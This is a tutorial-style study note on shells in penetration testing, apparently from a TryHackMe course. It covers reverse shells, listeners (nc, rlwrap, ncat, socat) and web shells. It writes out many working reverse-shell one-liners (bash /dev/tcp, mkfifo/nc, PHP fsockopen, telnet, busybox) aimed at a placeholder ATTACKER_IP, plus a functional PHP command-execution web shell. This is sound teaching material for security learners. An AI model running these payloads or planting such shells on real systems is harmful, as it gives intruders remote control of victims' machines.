# What is a Shell?

A **shell** is software that allows a user to interact with an **Operating System (OS)**.

It acts as a bridge between the **user** and the **operating system**, allowing users to execute commands and perform tasks.

There are two common types of shells:

* **Graphical Shell (GUI):** Uses windows, icons, and menus (e.g., Windows Desktop).
* **Command-Line Shell (CLI):** Uses text-based commands entered through a terminal or command prompt (e.g., Bash, PowerShell, CMD).

In cybersecurity, the term **shell** usually refers to a **remote command-line session** that an attacker gains after compromising a target system.

Once attackers obtain a shell, they can execute commands on the target computer as if they were sitting in front of it.

## Why is a Shell Important?

A shell gives attackers direct control over the compromised system. The amount of control depends on the permissions of the compromised account.

After obtaining a shell, attackers can perform several activities, including:

### 1. Remote System Control

Attackers can execute commands and run programs on the target system remotely.

Example:

```bash
whoami
pwd
ls
```

### 2. Privilege Escalation

If the attacker initially gains access as a low-privileged user, they may attempt to increase their privileges to gain administrator or root access.

Higher privileges provide greater control over the system.

### 3. Data Exfiltration

Attackers can search for sensitive information such as:

* Password files
* Databases
* Documents
* Configuration files

They may then copy this data to their own system.

### 4. Persistence

To maintain access even after disconnecting, attackers may:

* Create new user accounts
* Add SSH keys
* Install backdoors
* Schedule malicious tasks

This allows them to reconnect later without exploiting the system again.

### 5. Post-Exploitation Activities

After gaining shell access, attackers may perform additional malicious actions, such as:

* Installing malware
* Creating hidden administrator accounts
* Modifying or deleting files
* Disabling security tools
* Running additional exploits

These actions are known as **post-exploitation activities** because they occur after the initial compromise.


### 6. Pivoting to Other Systems

Sometimes the compromised machine is not the final target.

Instead, attackers use it as a stepping stone to reach other systems within the same network.

This process is called **pivoting**.

Example:

```text
Attacker
     │
     ▼
Compromised Computer
     │
     ▼
Database Server
```

The attacker first compromises one machine and then uses it to attack other devices on the internal network.

----------

# Reverse Shell

A **Reverse Shell** (also called a **Connect Back Shell**) is one of the most common techniques attackers use to gain remote access to a compromised system.

Unlike a normal connection, where the attacker connects to the victim, a reverse shell works in the opposite way—the **victim machine initiates the connection to the attacker's machine**.

This approach is commonly used because many firewalls block incoming connections but allow outgoing connections. Since the victim starts the connection, it is often less likely to be blocked.

## How a Reverse Shell Works

A reverse shell works in three simple steps:

1. The attacker starts a listener and waits for a connection.
2. The victim executes a reverse shell payload.
3. The victim connects back to the attacker, giving the attacker remote command-line access.

 

## Step 1: Set Up a Netcat Listener

The attacker first prepares a listener using **Netcat (nc)**.

Netcat is a networking utility that can send and receive data over a network.

The attacker runs the following command:

```bash
nc -lvnp 443
```

After running the command, Netcat waits for an incoming connection.

### Command Options

| Option | Description                                               |
| ------ | --------------------------------------------------------- |
| `-l`   | Listen for incoming connections.                          |
| `-v`   | Enable verbose mode to display connection details.        |
| `-n`   | Use IP addresses directly without performing DNS lookups. |
| `-p`   | Specify the listening port.                               |

In this example, Netcat listens on **port 443**.

Attackers can use **any port**, but they often choose commonly used ports such as:

* 53 (DNS)
* 80 (HTTP)
* 443 (HTTPS)
* 8080 (HTTP Alternative)
* 139 (NetBIOS)
* 445 (SMB)

Using common ports helps the reverse shell blend with normal network traffic.
 

## Step 2: Execute a Reverse Shell Payload

Once the listener is ready, the attacker executes a **reverse shell payload** on the compromised system.

A **payload** is a command or script that creates the connection from the victim back to the attacker.

Example payload:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

### Payload Explanation

**`rm -f /tmp/f`**

Deletes any existing named pipe (`/tmp/f`) so a new one can be created without conflicts.

**`mkfifo /tmp/f`**

Creates a **named pipe (FIFO)**.

A named pipe is a special file that allows two programs to communicate with each other.

**`cat /tmp/f`**

Reads data coming from the named pipe.

Whenever the attacker sends a command, it is received through this pipe.

**`sh -i`**

Starts an interactive shell so the attacker can execute commands remotely.

**`2>&1`**

Redirects error messages to the standard output, ensuring that both normal output and errors are sent back to the attacker.

**`nc ATTACKER_IP ATTACKER_PORT`**

Netcat connects to the attacker's IP address and listening port.

This establishes the reverse shell connection.

**`>/tmp/f`**

Sends the shell output back into the named pipe, allowing continuous two-way communication between the attacker and the victim.

 

## Step 3: Attacker Receives the Shell

If the payload executes successfully, the victim connects to the attacker's Netcat listener.

The attacker now receives an interactive shell and can execute commands on the compromised machine just as if they were sitting in front of it.

Example output:

```text
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964

target@tryhackme:~$
```

The IP address **10.10.13.37** is the compromised target that connected back to the attacker's machine.

Once the prompt appears (`target@tryhackme:~$`), the attacker has successfully obtained a reverse shell and can execute commands remotely.

---

> **A reverse shell payload depends on what languages or tools are available on the target machine.**


## Why Are There So Many Reverse Shell Payloads?

Every operating system is different.

Some systems may have:

* Python
* PHP
* Perl
* Bash
* Ruby
* Netcat

Others may only have one or two of these.

Because of this, attackers and penetration testers keep multiple payloads ready.

## General Syntax

Almost every reverse shell payload follows the same pattern:

```text
Program → Connect to Attacker IP → Connect to Attacker Port → Start Shell
```

The only thing that changes is the programming language or tool being used.


## Bash Reverse Shell

Uses the Bash shell to connect back to the attacker.

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

Use this when **Bash** is installed.


## Perl Reverse Shell

Uses the Perl interpreter to create a reverse shell.

```perl
perl -e '...'
```

Use this when **Perl** is available.


## Python Reverse Shell

Uses Python's socket library to connect back to the attacker.

```python
python -c '...'
```

Use this when **Python** is installed.

## PHP Reverse Shell

Uses PHP functions to create a TCP connection and start a shell.

```php
php -r '...'
```

Commonly used after exploiting a vulnerable web application running PHP.


## Ruby Reverse Shell

Uses Ruby's socket library to connect back to the attacker.

```ruby
ruby -rsocket -e '...'
```

Use this when **Ruby** is installed.


## Netcat Reverse Shell

Some versions of Netcat support the `-e` option.

```bash
nc -e /bin/sh ATTACKER_IP PORT
```

If the installed version **does not support `-e`**, use the FIFO (named pipe) method instead.

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT >/tmp/f
```

This is the same technique explained in the previous section.


## Java Reverse Shell

Java can also create a reverse shell using its runtime environment.

```java
Runtime.getRuntime().exec(...)
```

This is useful if Java is installed on the target machine.


## Xterm Reverse Shell

Instead of providing a normal command-line shell, this method opens a remote **Xterm window**.

It requires:

* An X Server running on the attacker's machine.
* The target system to allow graphical connections.

This method is much less common than Bash or Netcat reverse shells.

------------

# Shell Listeners

In the previous sections, we used **Netcat (nc)** to receive a reverse shell.

However, **Netcat is not the only tool** that can listen for incoming shell connections.

There are several tools that can act as **listeners**, each offering different features and improvements.

The most commonly used listeners are:

* Netcat (nc)
* Rlwrap
* Ncat
* Socat

## 1. Rlwrap

**Rlwrap** is a small utility that improves the usability of command-line programs such as Netcat.

It uses the **GNU Readline** library to provide features that a normal Netcat shell does not have.

These features include:

* Command history
* Arrow key support
* Line editing
* Easier command navigation

Instead of running Netcat directly, you run Netcat through Rlwrap.

### Example

```bash
rlwrap nc -lvnp 443
```

### Why use Rlwrap?

A normal Netcat shell is limited.

For example:

* The **Up Arrow** usually doesn't show previous commands.
* Editing long commands is inconvenient.

Rlwrap makes the shell behave more like a normal Linux terminal, making it much easier to work with.

## 2. Ncat

**Ncat** is an enhanced version of Netcat developed by the **Nmap Project**.

It provides all the basic features of Netcat while adding several advanced capabilities.

Some additional features include:

* SSL/TLS encryption
* IPv6 support
* Better performance
* More flexible networking options

### Listening for a Reverse Shell

```bash
ncat -lvnp 443
```

This command works similarly to Netcat and waits for an incoming reverse shell connection.

### Listening with SSL Encryption

```bash
ncat --ssl -lvnp 443
```

The `--ssl` option enables **SSL/TLS encryption**.

This encrypts the communication between the attacker and the compromised machine.

Encryption helps protect the shell traffic from being easily intercepted or read during transmission.

## 3. Socat

**Socat (SOcket CAT)** is a powerful networking utility used to create connections between two data sources.

It is much more flexible than Netcat and supports many different communication methods.

In penetration testing, Socat can be used to receive reverse shells.

### Listening for a Reverse Shell

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

### Command Explanation

| Option           | Description                                                                                        |
| ---------------- | -------------------------------------------------------------------------------------------------- |
| `-d -d`          | Enables detailed (verbose) output. Using `-d` twice increases the amount of information displayed. |
| `TCP-LISTEN:443` | Starts a TCP listener on port **443**.                                                             |
| `STDOUT`         | Displays all received data directly in the terminal.                                               |

After running this command, Socat waits for an incoming connection just like Netcat.


## Comparison of Listener Tools

| Tool            | Main Purpose                | Advantages                                                      |
| --------------- | --------------------------- | --------------------------------------------------------------- |
| **Netcat (nc)** | Basic listener              | Simple and lightweight.                                         |
| **Rlwrap**      | Improves Netcat             | Adds command history, arrow keys, and line editing.             |
| **Ncat**        | Advanced Netcat             | Supports SSL/TLS encryption and additional networking features. |
| **Socat**       | Advanced networking utility | Highly flexible and supports many types of network connections. |

## Which Tool Should You Use?

The choice depends on your needs.

* **Netcat** – Best for simple reverse shell listeners.
* **Rlwrap** – Use when working with Netcat to get a more user-friendly shell.
* **Ncat** – Use when encryption (SSL/TLS) or advanced networking features are required.
* **Socat** – Use for more advanced networking scenarios and complex shell connections.

----------

This section is much simpler than it looks. **You do not need to memorize every payload.** The important thing is to understand **which language/tool is being used and when to use it.**

---

# Shell Payloads

A **Shell Payload** is a command or script that creates a shell connection between the **target** and the **attacker**.

Depending on the shell type, a payload can:

* Create a **Reverse Shell**, where the target connects back to the attacker.
* Create a **Bind Shell**, where the target opens a port and waits for the attacker to connect.

Different operating systems and applications support different programming languages. Therefore, there are many shell payloads, each written in a different language.

---

## Why Are There Multiple Payloads?

Not every target system has the same software installed.

For example:

* A Linux server may have **Bash**.
* A web server may have **PHP**.
* Another machine may only have **Python**.
* Some embedded devices may only have **BusyBox**.

As a penetration tester, you choose the payload that matches the software available on the target.

---

# Bash Reverse Shell Payloads

Bash payloads are used when the target system has the **Bash shell** installed.

### Standard Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

Creates an interactive Bash shell and connects it to the attacker's machine.



### Bash Reverse Shell Using Read Loop

```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

Uses **file descriptor 5** to establish the connection and continuously read commands from the attacker.



### Bash Reverse Shell Using File Descriptor 196

```bash
0<&196; exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

Uses **file descriptor 196** to send and receive data through the same TCP connection.


### Bash Reverse Shell Using File Descriptor 5

```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Similar to the previous payload but uses **file descriptor 5** instead of **196**.


# PHP Reverse Shell Payloads

PHP payloads are useful when the target is running a **PHP web application**.

The payload first creates a socket connection and then starts a shell.

The difference between the following payloads is **only the PHP function used to execute the shell command**.

### Using `exec()`

```php
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

Uses PHP's **exec()** function.


### Using `shell_exec()`

```php
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

Uses **shell_exec()**.


### Using `system()`

```php
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

Uses **system()**, which immediately displays the command output.


### Using `passthru()`

```php
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

Uses **passthru()**, which is commonly used when working with binary output.


### Using `popen()`

```php
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3","r");'
```

Uses **popen()** to start the shell process.


# Python Reverse Shell Payloads

Python payloads are used when **Python** is installed on the target machine.


### Using Environment Variables

```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c '...'
```

Stores the attacker's IP address and port in environment variables before creating the reverse shell.


### Using the Socket Module

```python
python -c 'import socket,subprocess,os; ...'
```

Uses Python's **socket** module to connect to the attacker and starts an interactive Bash shell.

### Short Python Reverse Shell

```python
python -c 'import os,pty,socket; ...'
```

A shorter version of the previous payload that performs the same task using fewer lines of code.


# Other Reverse Shell Payloads

## Telnet

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

Uses **Telnet** to connect to the attacker and execute commands through a named pipe.


## AWK

```bash
awk 'BEGIN { ... }' /dev/null
```

Uses AWK's built-in networking capability to create a reverse shell.

Although uncommon, it is useful if AWK is available but other scripting languages are not.


## BusyBox

```bash
busybox nc ATTACKER_IP 443 -e sh
```

Uses BusyBox's version of **Netcat** to connect to the attacker and execute a shell.

This payload is commonly used on embedded Linux devices such as routers and IoT systems.

-------

# Web Shell

A **Web Shell** is a script uploaded to a web server that allows an attacker to execute operating system commands through a web browser.

Unlike a reverse shell or bind shell, a web shell runs **inside the web server**. The attacker interacts with it by sending HTTP requests.

Web shells are one of the most common methods attackers use to maintain access to a compromised web server.


## How Does a Web Shell Work?

A web shell follows a simple process:

1. The attacker uploads a malicious script to the web server.
2. The web server stores the script.
3. The attacker accesses the script through a web browser.
4. The script executes operating system commands on the server.
5. The command output is displayed in the browser.


## Supported Languages

A web shell can be written in any language supported by the web server.

Common languages include:

* PHP
* ASP
* JSP
* CGI
* ASP.NET

The programming language depends on the technology used by the target website.


## Example PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```


## Code Explanation

### `$_GET['cmd']`

Reads the value of the **cmd** parameter from the URL.

Example:

```text
shell.php?cmd=whoami
```

Here,

```text
cmd = whoami
```


### `isset($_GET['cmd'])`

Checks whether the **cmd** parameter exists in the URL.

If it exists, the command will be executed.

If it doesn't exist, nothing happens.


### `system()`

Executes an operating system command.

Whatever command is passed through **cmd** is executed on the web server.

## How Is a Web Shell Uploaded?

Attackers first exploit a vulnerability that allows them to place files on the server.

Common methods include:

* Unrestricted File Upload
* File Inclusion vulnerabilities
* Command Injection
* Remote Code Execution (RCE)
* Stolen administrator credentials
* Misconfigured web servers

After uploading the file, the attacker simply accesses it through the browser.


## Accessing the Web Shell

Suppose the attacker uploads:

```text
shell.php
```

to

```text
/uploads/
```

The web shell becomes accessible at:

```text
http://victim.com/uploads/shell.php
```

At this point, the file is waiting for commands.


## Executing Commands

The attacker adds the **cmd** parameter to the URL.

Example:

```text
http://victim.com/uploads/shell.php?cmd=whoami
```

When the server receives this request:

1. PHP reads the value of **cmd**.
2. The `system()` function executes **whoami**.
3. The output is returned to the browser.

Example output:

```text
www-data
```

The attacker can now execute other commands in the same way.

Example:

```text
http://victim.com/uploads/shell.php?cmd=pwd
```

```text
http://victim.com/uploads/shell.php?cmd=ls
```

```text
http://victim.com/uploads/shell.php?cmd=id
```


## Why Are Web Shells Popular?

Web shells are popular because they:

* Allow remote command execution through a browser.
* Can remain hidden inside a web application.
* Are easy to upload if a vulnerability exists.
* Help attackers maintain persistent access.
* Can be used to upload files, download files, and manage the server.


## Popular Web Shells

Instead of writing their own web shell, attackers often use existing web shells that provide many built-in features.

### p0wny-shell

A lightweight, single-file PHP web shell.

Features:

* Remote command execution
* Simple web interface
* Easy to deploy

### b374k Shell

A feature-rich PHP web shell.

Features:

* File manager
* Command execution
* File upload and download
* File editing
* System information

### c99 Shell

One of the oldest and most well-known PHP web shells.

Features:

* Command execution
* File management
* Database management
* Server information
* Many administrative functions


## Comparison of Popular Web Shells

| Web Shell       | Features                                               |
| --------------- | ------------------------------------------------------ |
| **p0wny-shell** | Lightweight command execution.                         |
| **b374k Shell** | File manager, command execution, file upload/download. |
| **c99 Shell**   | Advanced web shell with many administrative features.  |


## Reverse Shell vs Web Shell

| Reverse Shell                        | Web Shell                                      |
| ------------------------------------ | ---------------------------------------------- |
| Connects the target to the attacker. | Runs inside a web server.                      |
| Uses TCP connections.                | Uses HTTP/HTTPS requests.                      |
| Provides a terminal session.         | Commands are executed through a web page.      |
| Usually temporary.                   | Can remain on the server for long-term access. |

---


some ref links:

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/flozz/p0wny-shell

https://github.com/b374k/b374k


https://www.r57shell.net/index.php



